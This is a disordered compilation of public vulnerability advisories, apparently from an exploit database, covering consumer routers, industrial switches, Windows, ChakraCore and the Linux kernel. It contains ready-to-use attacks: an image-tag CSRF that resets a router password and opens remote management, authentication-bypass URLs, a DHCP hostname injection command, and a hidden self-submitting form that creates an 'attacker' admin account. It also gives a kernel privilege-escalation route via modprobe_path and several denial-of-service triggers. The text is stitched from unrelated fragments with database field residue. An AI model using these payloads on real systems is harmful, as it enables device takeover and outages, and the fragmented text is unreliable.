src=""http://192.168.1.1/Gozila.cgi?PasswdModify=1&sysPasswd=__pwn3d__&sysPasswdConfirm=__pwn3d__&Remote_Upgrade=1&Remote_Management=1&RemotePort=31337&UPnP_Work=0"";
alt=""Nothing to see here."" />
And once again, a modification can be made to attempt to log in with
the default password, as shown here:
<img src=""http://a:admin () 192 168 1
1/Gozila.cgi?PasswdModify=1&sysPasswd=__pwn3d__&sysPasswdConfirm=__pwn3d__&Remote_Upgrade=1&Remote_Management=1&RemotePort=31337&UPnP_Work=0""
alt=""Nothing to see here."" />
It is worth mentioning that even if a user has changed the router's
password, but is using a weak password, they may still be vulnerable
to this type of attack. An attacker could simply try many weak
passwords in a dictionary-style attack. They could also use javascript
to attempt to brute force the password, provided that they were able
to get the victim to stay on a page for a reasonably long time.

# Date: 12-01-2011
# Author: Craig Heffner, /dev/ttyS0
# Firmware Link: http://www.dlink.co.uk/
# Firmware Version(s): All
# Tested on: DIR-300, DIR-320, DIR-615 revD
http://192.168.0.1/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0","Multiple D-Link routers that use a PHP based Web interface suffer from the same authentication bypass
vulnerability which allows unprivileged users to view and modify administrative router settings.
Further, even if remote administration is disabled this vulnerability can be exploited by a remote
attacker via a CSRF attack.
The vulnerability has been confirmed in the following routers:
DIR-615 revD
DIR-320
DIR-300
The following example URL will allow access to the router's main administrative Web page without authentication:
For a more detailed description of the vulnerability, see: http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf.
Note that this vulnerability was independently discovered in the DIR-300 and subsequently reported by Karol Celin on 09-Nov-2010 [1].

Like every CSRF attack, the victim must be logged in first before he
opens this malicious page.
Then he should wait some seconds until the router receives all the requests.
It may take few tries until it works.
The code should be split into parts because the router limits the
VIRTUALSVR_Application parameter length.
The author doesn't take any responsibility for what you do with that code.

2010-01-10,WebApps,Hardware,SourceSec DevTeam,D-Link Routers,Authentication Bypass (2),http://www.sourcesec.com/Lab/dlink_hnap_captcha.pdf,"Multiple D-­Link routers suffer from insecure implementations of the Home Network Administration
Protocol which allow un­authenticated and/or un­privileged users to view and configure administrative
settings on the router.
Further, the mere existence of HNAP allows attackers to completely bypass the CAPTCHA login
features that D-­Link has made available in recent firmware releases.
It is suspected that most, if not all, D­-Link routers manufactured since 2006 have HNAP support and
are vulnerable to one of the below described vulnerabilities. However, only the following routers and
firmware versions have been confirmed to date:
1) DI­524 hardware version C1, firmware version 3.23
2) DIR­628 hardware version B2, firmware versions 1.20NA and 1.22NA
3) DIR­655 hardware version A1, firmware version 1.30EA

Alert details
Cross Site Scripting
Severity ==========> High
Type ==============> Validation
Description
This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code
(usually in the form of Javascript) to another user. Because a browser cannot know if the script should be trusted
or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens
retained by the browser.
Impact
Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a
user in order to gather data from them. An attacker can steal the session cookie and take over the account,
impersonating the user. It is also possible to modify the content of the page presented to the user.
Recommendation
The script script should filter metacharacters from user input.

Vendor: http://www.netgear.com
Date: 15 June, 2009
Author: tom@tomneaves.co.uk < tom@tomneaves.co.uk >
Original URL: http://www.tomneaves.co.uk/Netgear_DG632_Remote_DoS.txt
Discovered: 18 November, 2006
Disclosed: 15 June, 2009
I. DESCRIPTION
The Netgear DG632 router has a web interface which runs on port 80.  This
allows an admin to login and administer the device's settings.  However,
a Denial of Service (DoS) vulnerability exists that causes the web interface
to crash and stop responding to further requests.
II. DETAILS
Within the ""/cgi-bin/"" directory of the administrative web interface exists a
file called ""firmwarecfg"".  This file is used for firmware upgrades.  A HTTP POST
request for this file causes the web server to hang.  The web server will stop
responding to requests and the administrative interface will become inaccessible
until the router is physically restarted.
While the router will still continue to function at the network level, i.e. it will
still respond to ICMP echo requests and issue leases via DHCP, an administrator will
no longer be able to interact with the administrative web interface.
This attack can be carried out internally within the network, or over the Internet
if the administrator has enabled the ""Remote Management"" feature on the router.
Affected Versions: Firmware V3.4.0_ap (others unknown)
III. VENDOR RESPONSE
12 June, 2009 - Contacted vendor.
15 June, 2009 - Vendor responded.  Stated the DG632 is an end of life product and is no
longer supported in a production and development sense, as such, there will be no further
firmware releases to resolve this issue.

Original URL: http://www.tomneaves.co.uk/Netgear_DG632_Authentication_Bypass.txt
Discovered: 18 November, 2006
Disclosed: 15 June, 2009
I. DESCRIPTION
The Netgear DG632 router has a web interface which runs on port 80.
This allows an admin to login and administer the device's settings.
Authentication of this web interface is handled by a script called
""webcm"" residing in ""/cgi-bin/"" which redirects to the relevant pages
depending on successful user authentication. Vulnerabilities in this
interface enable an attacker to access files and data without
authentication.
II. DETAILS
The ""webcm"" script handles user authentication and attempts to load
""indextop.htm"" (via javascript below).  The ""indextop.htm"" page requires
authentication (HTTP Basic Authorization).
<script language=""javascript"" type=""text/javascript"">
function loadnext() {
document.forms[0].submit();
}</script></head>
<body bgcolor=""#ffffff"" onload=""loadnext()"" >
Loading file ...
<form method=""POST"" action=""../cgi-bin/webcm"" id=""uiPostForm"">
<input type=""hidden"" name=""nextpage"" value=""../html/indextop.htm"" id=""uiGetNext"">
</form>
If a valid password to the default ""admin"" user is supplied, the script
then continues to load the ""indextop.htm"" page and continues to load the
other frames based on a hidden field.  If user authentication is
unsuccessful, the user is returned back to ""../cgi-bin/webcm"".  It is
possible to bypass the ""webcm"" script and access specific files directly
without the need for authentication.
Normal use:
This would ask for the user to authenticate and would refuse access to
this file if authentication details were not known.  All the script is
doing is making sure authentication is forced upon the user.  The same
""stattbl.htm"" file can be accessed without having to provide any
authentication using the following URL:
Another example:
(returns 401 - Forbidden)
Bypassing the ""webcm"" script:
(returns 200 - OK)
In the example above (modemmenu.htm), the full source can be viewed
which discloses further directories and files within the javascript of
the page. A sample of files disclosed within modemmenu.htm and available
to download are:
/html/onload.htm
/html/form.css
/gateway/commands/saveconfig.html
/html/utility.js (full source)
There are many other files that are accessible by calling them directly
instead of going via the ""webcm"" script, the above are just a sample. In
addition, it is possible to specify paths to the ""webcm"" script as shown
below:
This allows an attacker to enumerate what files and directories exist
within the www root directory and beyond by using 200, 403 and 404
errors as a guide.
Affected Versions: Firmware V3.4.0_ap (others unknown)

CVE :
ISS X-Force: :
After establishing a tcp connection to the affected device on port 53 from the
LAN interface and after closing the connection the router will restart.
Sometimes when using the web trigger with Internet explorer the WAN
configuration (ip, gateway ip, dns servers) for the device was lost and a
hardware reset was needed in order to make the device usable again.
This issue can be triggered from the LAN interface by direct connection or
by using specially crafted web content. For the web content to be able to
trigger the issue a browser withouth security restrictions on connection to
port 53 must be used, the tests done shows Internet Explorer like the only
one cappable of activating the bug.
Test made worked with Internet explorer version 7.0.6001.18000, it
didnt worked with Opera version 9.63 build 10476, Mozilla Firefox
version 3.0.1. nor Chrome 1.0.154.48. The html tags <img>, <link> an <base>
worked.
Steps to reproduce:
Or force someone into the lan segment of the router to open an html file
with one of the following tags and wait for the connection to be established
and closed. After 5 upon 10 seconds the device will reboot.

Synopsis: Denial of Service condition in Netgear's WGR614v9 Wireless Router
Firmware version tested: v1.2.2_14.0.13NA (LATEST)
Firmware version tested: WNR834Bv2 v2.0.8_2.0.8 # GTADarkDude tested
Proof of Concept:
Appending a question mark to the router's internal IP address after
the forward slash. e.g., http://192.168.1.1/? results in a denial of
service condition where the http server dies and the administrative
interface is no longer available until after a device reboot.

# milw0rm.com [2009-02-23]","XSS Attack using SMS to Optus/Huawei E960 HSDPA Router
Synopsis
Huawei E960 HSDPA Router (firmware version 246.11.04.11.110sp04) is
vulnerable to XSS attack using SMS. One of the feature of this router
is the ability to send and receive SMS through its web interface. The
SMS text is presented unescaped/unfiltered on the inbox view, and an
attacker can craft malicious short messages to gain control over
victims router.
Details
The first 32 characters of every incoming SMS is presented in
unescaped form in the inbox view. The 32 characters limit can be
overcome by using several messages, and inserting javascript comment
to merge the current message with the next one.
Example:
First message ends with /* which will comment the all the HTML code up
to the second message
<script>alert('hello '/*
and the second message will start with */ that will close the comment
and continue the script:
*/+'world');</script>
Note that newest message is presented first, so the order of the SMS
sending must be reversed.
Impact
An attacker can
- get victim's PPP password by accessing /js/connection.js
- disconnect victim's internet connection
- send SMS with victim's router
- gain access to victim's WIFI password
Recovery
After an attack is performed, the inbox page can not be used to delete
the received messages (because the delete button is not
available/visible). To remove offending messages from the inbox,
telnet to the router with username 'admin' and password 'admin'.
Huawei E960 uses busybox shell, so standard rm command can be used to
remove the messages (it is located at /tmp/sms/inbox_sms). After
removing the message content, the deleted messages will still be in
the inbox index, but it can now be removed from the inbox page.

Netgear VPN router SSL312 is proune to a remote DoS condition which can get
triggered if somebody has access to the webinterface of the VPN router.
The problem is related to a propietary CGI binary and makes is impossible
for users to patch the router. Further in detail analyses will show several
other issues like outdated third party software (e.g. the webserver) and further
problems in the cgi-binary itself which won't get disclosed here.
If you download the source code the affected binary can be found at:
./NG_SSL312-GPL/uClinux/uC-src/real/EasyAccess/EasyAccess/www/cgi-bin/single_cgi
Steps to reproduce:
Visit the Netgear SSL312 VPN router webinterface.
You will see a login field and a password field.
Just enter any random data and proceed.
The URL will include a path like:
If you modify the URL as below and resend your http request the device will
crash and needs a hard reboot.
Example network affected by this: StudiVZ
Simple google dork:
intitle:SSL-VPN intext:password inurl:/cgi-bin/welcome
Workaround:
Preventing others to gain access to the webinterface of the router prevents
the attack.
Kind regards,
Rembrandt"

1) Introduction
2) Vulnerability
3) The Exploit
4) The Code
5) Fix
1) Introduction
Telecom Italia is the most important Italian ISP offering an ADSL
service named ""Alice"".
Telecom Italia rent out with ""Alice Adsl"" service, different CPE
Modem/Router among which
the affected ones.
The interface to configure these modems are made extremily poor by the
provider to ensure
more control.
There's no way to enable telnet, ftp, tftp or more advanced web pages
from the web interface.
2) Vulnerability
An attacker can activate and get unauthorized access to the routers
administration
interface and telnet/ftp/tftp services from internal network.
Every user in the LAN (or Wireless LAN) can nevertheless have access
to the routers
administration interface and telnet/ftp/tftp!
If an attacker can get access to the administrator interface and
login, he has full control
over the routers configuration.
3) The Exploit
To enable telnet/ftp/tftp and web-admin interface it is necessary send a special
IP packet to router specific ip 192.168.1.1.
This works only from internal LAN where an attacker have and ip like
192.168.1.XX.
The ip packet send to router must have the following feature:
1)IP-protocol-number 255 (there's a RAW SOCKET listening on the router)
2)Payload size 8 byte
3)The payload are the first 8 byte of a salted md5 of the mac address
of device br0
4)br0 in these modems has the same mac of eth0
When the modem receives the packet all services will be enabled.
Example:
>From a GNU/LINUX distrib:
1)Retrieve br0 maccaddress:
arping -I eth0 -c 2 192.168.1.1
ARPING 192.168.1.1 from 192.168.1.2 eth0
Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  8.419ms
Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  2.095ms
Sent 2 probes (1 broadcast(s))
Received 2 response(s)
2)Calculate special md5 hash from br0 macaddress: create an hex 6 byte
long file with the mac address.
run the application below and copy the output hash.
3)Send ip packet to router ip 192.168.1.1 with 8 byte paylod file
(with the tool you like)
i.e.: nemesis ip -D 192.168.1.1 -p 255 -P hash.hex
4)Telnet to router :
telnet 192.168.1.1

# Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404) Remote CSRF Exploit (dhcp hostname attack)
# Discovery Date     : 13/09/2009
# Author             : Underz0ne Crew
#                      Zigma
# Author Of The Tool : Rafael Dominguez Vega
# First Of all Read this paper : http://www.mwrinfosecurity.com/publications/mwri_behind-enemy-lines_2008-07-25.pdf
# Description : Using DHCP as a method of attack, arbitrary and malicious scripting can be injected into the DHCP administrative and logs pages (if enabled). When the web administration toold is accessed, the code injection will execute with administrative privileges, which could lead to a complete compromise of the system.
#  How To Exploit :
# Zigma@Underz0ne # python dhcpattack.py -i eth0 -t 192.168.1.1 -p ""<IFRAME height=0 width=0 src='http://192.168.1.1/restoreinfo.cgi'></IFRAME>""
# 0y]Z
# Starting....
# .
# Sent 1 packets.
# Now When the Admin Enters to ""Advanced Status"" ""DHCP"" the CSRF Get's executed and the account get reseted , now u can simply access the web-based Administration Panel with : admin:admin
# So Many Routers Suffers from dhcp hostname attack...

##  Belkin Wireless G Plus MIMO Router F5D9230-4
##  Authentication Bypass Vulnerability
## AUTHOR:
##  DarkFig < gmdarkfig (at) gmail (dot) com >
##  http://acid-root.new.fr/?0:17
##  #acidroot@irc.worldnet.net
## INTRODUCTION:
##  I recently bought this router for my local
##  network (without modem integrated), now I can tell
##  that it was a bad choice. When my ISP disconnects
##  me from internet, in the most case I have to reboot
##  my Modem and the Router in order to reconnect.
##  So I coded a program (which send http packets) to reboot
##  my router, it asks me the router password, and reboots it.
##  One day I wrote a bad password, but it worked. So I
##  decided to make some tests in order to see if there was
##  a vulnerability.
## DESCRIPTION:
##  Apparently when the router starts, it creates a file
##  (without content) named user.conf, then when we go to
##  SaveCfgFile.cgi, the configuration is saved to the file
##  user.conf. But the problem is that we can access to the
##  file SaveCfgFile.cgi without login.
## PROOF OF CONCEPT:
##  For example we can get the configuration file here:
##  http://<ROUTER_IP>/SaveCfgFile.cgi
##  pppoe_username=...
##  pppoe_password=...
##  wl0_pskkey=...
##  wl0_key1=...
##  mradius_password=...
##  mradius_secret=...
##  httpd_password=...
##  http_passwd=...
##  pppoe_passwd=...
##  Tested on the latest firmware for this product
##  (version 3.01.53).
## PATCH:
##  Actually (08-01-19) there is no firmware update, but I
##  contacted the author, if they'll release a patch, it
##  will be available here:

2006-03-04,DoS,Hardware,Ryan Meyer,Multiple Routers,'IRC Request' Disconnect Denial of Service,# milw0rm.com [2006-03-04],"It appears that various routers are prone to an IRC-only DoS attack.
Particularly Netgear and Linksys routers have been shown vulnerable.
If a client behind one of the vulnerable routers connects to an IRC server on port 6667
(and only 6667, does not DoS with other ports) and a user posts the following string
in either a channel, private message, ctcp, notice, etc.. the router will drop the connection.
The string is as follows:
DCC SEND anylongrandomstringhere
Further, it appears the routers that are vulnerable to this are running vxworks as their
embedded OS. Older linux Linksys routers appear to be immune."

Vendor Response:
Issue 1:
Due to the limited information given out, we are not considering it a vulnerability as such. Still, it would be better if it was not happening, so, we will treat it as a hardening enhancement.
Issue 2:
The developers won't be able to provide a fix for this in the short term (90 days), so, we are planning to disclose this issue through an advisory on July 17th 2019.
We have assigned CVE CVE-2019-1943 for this issue.

https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/43446.zip","Windows maintains a DC cache in win32kbase!gpDispInfo->pdceFirst. If you create multiple windows from a shared class while switching between CS_OWNDC and CS_CLASSDC, you can cause cache list entries to maintain references to free WND structures.
There are two interesting background posts on CS_OWNDC and CS_CLASSDC here:
Here is a minimal testcase:
$ cat dccache.c
int main(int argc, char **argv) {
WNDCLASSEX WindowClass = {0};
HWND WindowA, WindowB, WindowC;
ATOM Atom;
WindowClass.cbSize         = sizeof(WNDCLASSEX);
WindowClass.lpfnWndProc    = DefWindowProc;
WindowClass.lpszClassName  = ""Class"";
Atom = RegisterClassEx(&WindowClass);
WindowA = CreateWindowEx(0, MAKEINTATOM(Atom), ""One"", 0, CW_USEDEFAULT, 0, 128, 128, NULL, NULL, NULL, NULL);
SetClassLong(WindowA, GCL_STYLE, CS_CLASSDC);
WindowB = CreateWindowEx(0, MAKEINTATOM(Atom), ""Two"", 0, CW_USEDEFAULT, 0, 128, 128, NULL, NULL, NULL, NULL);
GetDC(WindowA);
SetClassLong(WindowA, GCL_STYLE, CS_CLASSDC | CS_OWNDC);
WindowC = CreateWindowEx(0, MAKEINTATOM(Atom), ""Three"", 0, CW_USEDEFAULT, 0, 128, 128, NULL, NULL, NULL, NULL);
return 0;
This might take a while to crash though, something has to cause the list to be traversed (e.g. a new window opens) after the freed memory has changed. It can also crash in some very strange places. We can speed the process up by trying to get the allocation ourselves.
First I need to know the size of a WND structure. If you look at the call to HMAllocObject() in win32kfull!xxxCreateWindowEx, you can see it's 240 bytes:
.text:00081BCC _xxxCreateWindowEx@68 proc near
.text:00081EE2 push    240             ; _DWORD
.text:00081EE7 push    1               ; _DWORD
.text:00081EE9 push    [ebp+var_12C]   ; _DWORD
.text:00081EEF push    ebx             ; _DWORD
.text:00081EF0 call    ds:__imp__HMAllocObject@16 ; HMAllocObject(x,x,x,x)
A well-known trick to get arbitrary sized allocations from the desktop heap is to use SetWindowText(), you just create a WCHAR string of the required length - good enough for testing.
e.g. SetWindowTextW(Window, L""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."");
So my plan is to create a thread to trigger the free, and then try to steal the allocation. See the testcase attached for my code.
This reliably crashes Windows 10 with version 10.0.15063.674, the crash looks like this:

So let's dump the DC Cache and see what it looks like, an entry looks something like:
typedef struct _DCE {
PDCE    pdceNext;
HANDLE  hDC;
PWND    pwndOrg;
PWND    pwndClip;
} DCE, *PDCE;
0: kd> r $t0=poi(poi(win32kbase!gpDispInfo)+8)
0: kd> .while (@$t0) { .printf ""dce %p ->pwndOrg %p\n"",@$t0,poi(@$t0+8); r @$t0=poi(@$t0) }
dce 99464440 ->pwndOrg 95423580
dce 922140e8 ->pwndOrg 00000000
dce 9239d638 ->pwndOrg 00000000
dce 9239beb0 ->pwndOrg 00000000
dce 99510540 ->pwndOrg 9541ede8
dce 92274178 ->pwndOrg 954004d0
dce 9223d2b0 ->pwndOrg 954004d0
dce 922050e8 ->pwndOrg 945504d0
So my theory is that one of these WND pointers is actually a bad reference, and
look at this:
0: kd> du 95423580
95423580  ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""
954235c0  ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""
95423600  ""AAAAAAAAAAA""
There is the text I set via SetWindowText().
(The testcase I sent Microsoft triggered a couple of other BSOD I want fixed as well. I'm hoping whoever gets assigned this bug will just fix them, they're dead easy oneline fixes).

MultiBr        ..., s28.var #0070
IRs after Type Specialization:
s52(s26).i32    =  Ld_A           s51(s24).i32 - ""i""                      #0011

BrGt_I4        $L2, s51(s24).i32, 38 (0x26).i32        #0070
$L8:                                                                          #0070

MultiBr        ..., s53(s28).i32! #0070
MultiBr instructions' offset operand(s28 in the above) must be of type Int32. If not, type confusion will occur. The way to ensure it is to use BailOutExpectingInteger.
In the above code, ""s26"" is ensured to be of type Int32 by the bailout. So, the other variables affected by ""s26"" including the offset variable ""s28"" are also ensured to be of type Int32.
What I noticed is ""s28.var = Sub_A s26.var, 2 (0x2).i32"". If we declare a variable ""j"" with ""i - 2"", the offset variable ""s28"" will be replaced with ""j"" in the CSE phase.
JS:
for (let i = 0; i < 100; i++) {
let j = i - 2;
switch (i) {

MultiBr        ..., s55(s28).i32! #0079
The offset variable is replaced with ""j"" that is not ensured to be of type Int32.
CORRECTION: The bug was that it tried to ensure the type using BailOutExpectingInteger, even if ""i"" was not always of type Int32. It was bypassed with the CSE phase. So if we created a case where ""j"" couldn't be of type Int32, type confusion occurred.

It ended up to use ""j"" of type Var as the offset variable.

#User Management#","Introduction
Vulnerabilities were identified in the Belden GarrettCom 6K and 10KT
(Magnum) series network switches. These were discovered during a black box
assessment and therefore the vulnerability list should not be considered
exhaustive; observations suggest that it is likely that further vulnerabilities
exist. It is strongly recommended that GarrettCom undertake a full whitebox
security assessment of these switches.
The version under test was indicated as: 4.6.0.  Belden Garrettcom released
an advisory on 8 May 2017, indicating that issues were fixed in 4.7.7:
GarrettCom-01 - Authentication Bypass: Hardcoded Web Interface Session Token
Severity: **High**
The string ""GoodKey"" can be used in place of a session token for the web
interface, allowing a complete bypass to all web interface authentication.
The following request/response demonstrates adding a user ‘gibson’ with the
password ‘god’ on any GarrettCom 6K or 10K switch.

GarrettCom-02 - Secrets Accessible to All Users
Severity: **High**
Unprivileged but authenticated users (""operator"" level access) can view the
plaintext passwords of all users configured on the system, allowing them to
escalate privileges to ""manager"" level.  While the default ""show config""
masks the passwords, executing ""show config saved"" includes the plaintext
passwords. The value of the ""secrets"" setting does not affect this.

GarrettCom-03 - Stack Based Buffer Overflow in HTTP Server
Severity: **High**
When rendering the /gc/flash.php page, the server performs URI encoding of
the Host header into a fixed-length buffer on the stack.  This decoding appears
unbounded and can lead to memory corruption, possibly including remote code
execution.  Sending garbage data appears to hang the webserver thread after
responding to the present request.  Requests with Host headers longer than
220 characters trigger the observed behavior.
GET /gc/flash.php HTTP/1.1

GarrettCom-04 - SSL Keys Shared Across Devices
Severity: **Moderate**
The SSL certificate on all devices running firmware version 4.6.0 is the
same.  This issue was previously reported and an advisory released by
ICS-CERT.  While GarrettCom reported the issue was fixed in 4.5.6, the web
server certificate remains static in 4.6.0:

Note that Belden Garrettcom has addressed this issue by reinforcing that
users of the switches should install their own SSL certificates if they
do not want to use the default certificate and key.
GarrettCom-05 - Weak SSL Ciphers Enabled
Severity: **Moderate**
Many of the SSL ciphers available for the switch are outdated or use
insecure ciphers or hashes.  Additionally, no key exchanges with perfect forward
secrecy are offered, rendering all previous communications possibly compromised,
given the issue reported above.  Particularly of note is the use of 56-bit DES,
RC4, and MD5-based MACs.

GarrettCom-06 - Weak HTTP session key generation
Severity: **Moderate**
The HTTP session key generation is predictable due to the lack of
randomness in the generation process. The key is generated by hashing the
previous hash result with the current time unit with precision around 50 unit
per second. The previous hash is replaced with a fixed salt for the first hash
generation.
The vulnerability allows an attacker to predict the first key that’s
generated by the switch if he has some knowledge about when the key was generated.
Alternatively, the vulnerability also enables privilege escalation attacks
which predict all future keys by observing two consecutive key generations of
lower privileges.

// trigger the binfmt module loading","Problem description: The initial observation was, that the linux vm86 syscall, which allows to use the virtual-8086 mode from userspace for emulating of old 8086 software as done with dosemu, was prone to trigger FPU errors. Closer analysis showed, that in general, the handling of the FPU control register and unhandled FPU-exception could trigger CPU-exceptions at unexpected locations, also in ring-0 code. Key player is the emms instruction, which will fault when e.g. cr0 has bits set due to unhandled errors. This only affects kernels on some processor architectures, currently only AMD K7/K8 seems to be relevant.
Virtual86SwitchToEmmsFault.c (http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/Virtual86SwitchToEmmsFault.c) was the first POC, that triggers kernel-panic via vm86 syscall. Depending on task layout and kernel scheduler timing, the program might just cause an OOPS without heavy side-effects on the system. OOPS might happen up to 1min after invocation, depending on the scheduler operation and which of the other tasks are using the FPU. Sometimes it causes recursive page faults, thus locking up the entire machine.
To allow reproducible tests on at least a local machine, the random code execution test tool (Virtual86RandomCode.c - http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/Virtual86RandomCode.c) might be useful. It still uses the vm86-syscall, but executes random code, thus causing the FPU and task schedule to trigger a multitude of faults and to faster lock-up the system. When executed via network, executed random data can be recorded and replayed even when target machine locks up completely. Network test:
socat TCP4-LISTEN:1234,reuseaddr=1,fork=1 EXEC:./Virtual86RandomCode,nofork=1
tee TestInput < /dev/urandom | socat - TCP4:x.x.x.x:1234 > ProcessedBlocks
An improved version allows to bring the FPU into the same state without using the vm86-syscall. The key instruction is fldcw (floating point unit load control word). When enabling exceptions in one process just before exit, the task switch of two other processes later on might fail. It seems that due to that failure, the task->nsproxy ends up being NULL, thus causing NULL-pointer dereference in exit_shm during do_exit.
When the NULL-page is mapped, the NULL-dereference could be used to fake a rw-semaphore data structure. In exit_shm, the kernel attemts to down_write the semaphore, which adds the value 0xffff0001 at a user-controllable location. Since the NULL-dereference does not allow arbitrary reads, the task memory layout is unknown, thus standard change of EUID of running task is not possible. Apart from that, we are in do_exit, so we would have to change another task. A suitable target is the shmem_xattr_handlers list, which is at an address known from System.map. Usually it contains two valid handlers and a NULL value to terminate the list. As we are lucky, the value after NULL is 1, thus adding 0xffff0001 to the position of the NULL-value plus 2 will will turn the NULL into 0x10000 (the first address above mmap_min_addr) and the following 1 value into NULL, thus terminating the handler list correctly again.
The code to perform those steps can be found in FpuStateTaskSwitchShmemXattrHandlersOverwriteWithNullPage.c (http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/FpuStateTaskSwitchShmemXattrHandlersOverwriteWithNullPage.c)
The modification of the shmem_xattr_handlers list is completely silent (could be a nice data-only backdoor) until someone performs a getxattr call on a mounted tempfs. Since such a file-system is mounted by default at /run/shm, another program can turn this into arbitrary ring-0 code execution. To avoid searching the process list to give EUID=0, an alternative approach was tested. When invoking the xattr-handlers, a single integer value write to another static address known from System.map (modprobe_path) will change the default modprobe userspace helper pathname from /sbin/modprobe to /tmp//modprobe. When unknown executable formats or network protocols are requested, the program /tmp//modprobe is executed as root, this demo just adds a script to turn /bin/dd into a SUID-binary. dd could then be used to modify libc to plant another backdoor there. The code to perform those steps can be found in ManipulatedXattrHandlerForPrivEscalation.c (http://www.halfdog.net/Security/2013/Vm86SyscallTaskSwitchKernelPanic/ManipulatedXattrHandlerForPrivEscalation.c).

.text:0000000000031B38 call memmove
Note that the size of the copy operation is the size of the data. As the division is dropping the remainder component, we can overflow the allocation by 1 to 5 bytes doing the following:
- call this function with data of size 6*x
- call this function again with size 6*x+y with 1<=y<=5
- then 6*x bytes will be allocated and stored at 0xee0
- and x will be saved at 0xee8;
- x will be compared with what is at 0xee8
- being equal it will proceed copying 6*x+y in a buffer of 6*x bytes at 0xee0
If exploited successfully (not sure if it's doable), it would lead to code execution in the context of the Host R0.
Please note that this issue has been silently fixed in Windows Server 2016 TP4 (and maybe prior).

During a penetration test, RedTeam Pentesting discovered a vulnerability
in the management web interface of an Alcatel-Lucent OmniSwitch 6450.
The management web interface has no protection against cross-site
request forgery attacks. This allows specially crafted web pages to
change the switch configuration and create users, if an administrator
accesses the website while being authenticated in the management web
interface.

Introduction
""The Alcatel-Lucent OmniSwitch 6450 Gigabit and Fast Ethernet Stackable
LAN Switches are the latest value stackable switches in the OmniSwitch
family of products. The OmniSwitch 6450 was specifically built for
versatility offering optional upgrade paths for 10 Gigabit stacking, 10
Gigabit Ethernet uplinks, from Fast to Gigabit user ports (L models) and
Metro Ethernet services.""
(from the vendor's homepage)
More Details
The management web interface of the OmniSwitch 6450 can be accessed
using a web browser via HTTP. The web interface allows creating new user
accounts, in this case an HTTP request like the following is sent to the
switch:
POST /sec/content/sec_asa_users_local_db_add.html HTTP/1.1
Host: 192.0.2.1
Cookie: session=sess_15739
Content-Type: application/x-www-form-urlencoded
Content-Length: 214
EmWeb_ns:mip:2.T1:I1=attacker
&EmWeb_ns:mip:244.T1:O1=secret
&EmWeb_ns:mip:246.T1:O2=-1
&EmWeb_ns:mip:248.T1:O3=
&EmWeb_ns:mip:249.T1:O4=1
&EmWeb_ns:mip:250.T1:O5=4
This request creates a user ""attacker"" with the password ""secret"". All
other parametres are static. All POST parametres can be predicted by
attackers
This means that requests of this form can be prepared by attackers and sent
from any web page the user visits in the same browser. If the user is
authenticated to the switch, a valid session cookie is included in the request
automatically, and the action is performed.
In order to activate the new user for the web interface it is necessary
to enable the respective access privileges in the user's profile. This can also
be done via the web interface. Then the HTTP POST request looks like the
following:
POST /sec/content/os6250_sec_asa_users_local_db_family_mod.html HTTP/1.1
Host: 192.0.2.1
Cookie: session=sess_15739
Content-Type: application/x-www-form-urlencoded
Content-Length: 167
EmWeb_ns:mip:2.T1:I1=attacker
&EmWeb_ns:mip:4.T1:O1=
&EmWeb_ns:mip:5.T1:O2=
&EmWeb_ns:mip:6.T1:O3=4294967295
&EmWeb_ns:mip:7.T1:O4=4294967295
This request sets all access privileges for the user ""attacker"" and
is again completely predictable.
Proof of Concept
Visiting the following HTML page will create a new user via the switch's
management web interface, if the user is authenticated at the switch:
<html>
<head>
<title>Alcatel-Lucent OmniSwitch 6450 create user via CSRF</title>
</head>
<body>
<form action=""http://192.0.2.1/sec/content/sec_asa_users_local_db_add.html""
method=""POST"" id=""CSRF"" style=""visibility:hidden"">
<input type=""hidden"" name=""EmWeb_ns:mip:2.T1:I1"" value=""attacker"" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O1"" value=""secret"" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O2"" value=""-1"" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O3"" value="""" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O4"" value=""1"" />
<input type=""hidden"" name=""EmWeb_ns:mip:244.T1:O5"" value=""4"" />
</form>
<script>
document.getElementById(""CSRF"").submit();
</script>
</body>
</html>
Workaround
Disable the web interface by executing the following commands:
AOS6:
no ip service http
no ip service secure-http
AOS 7/8:
ip service http admin-state disable
If this is not possible, use a dedicated browser or browser profile for
managing the switch via the web interface.
Fix
Upgrade the firmware to a fixed version, according to the vendor the
fixed versions will be available at the end of July 2015.
Security Risk
If attackers trick a logged-in administrator to visit an attacker-controlled
web page, the attacker can perform actions and reconfigure the switch. In this
situation an attacker can create an additional user account on the switch for
future access. While a successful attack results in full access to the switch,
the attack is hard to exploit because attackers need to know the IP address of
the switch and get an administrative user to access an attacker-controlled web
page. The vulnerability is therefore rated as a medium risk.

3. Calendar section:
A persistent XSS can be reached adding a new event in the Calendar; this event can be spread adding the Meeting Request option.
Since, using this injection point, the XSS can be spread to other users, this is the most dangerous of the four and can be used to spoofing sessions and therefore compromising the attacked users account
The JavaScript is executed simply viewing the calendar or when the Reminder pops up.

title: Privilege escalation vulnerability
product: MICROSENS Profi Line Modular Industrial Switch Web
Manager (MS652119PM)
vulnerable version: Firmware version 10.3.1

Vendor description:
""The new Profi Line Modular switches, from MICROSENS, offer maximum
performance and flexibility in smallest spaces. Robust, modular, expandable
and designed for greatest reliability and shortest recovery times, the Profi
Line Modular series has become the first-choice solution for Industrial
Ethernet.""
Business recommendation:
SEC Consult has identified a privilege escalation in the MICROSENS Web Manager
